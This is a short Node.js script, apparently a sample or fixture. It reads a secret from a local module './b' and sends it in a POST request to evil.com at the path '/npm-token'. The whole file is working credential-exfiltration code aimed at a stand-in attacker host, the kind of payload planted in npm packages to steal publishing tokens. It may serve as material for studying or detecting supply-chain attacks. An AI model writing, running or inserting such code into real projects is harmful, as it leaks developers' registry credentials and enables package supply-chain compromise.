const https = require('https');
const secret = require('./b');

const req = https.request({
  hostname: 'evil.com',
  path: '/npm-token',
  method: 'POST'
}, (res) => { res.resume(); });

req.write(secret);
req.end();
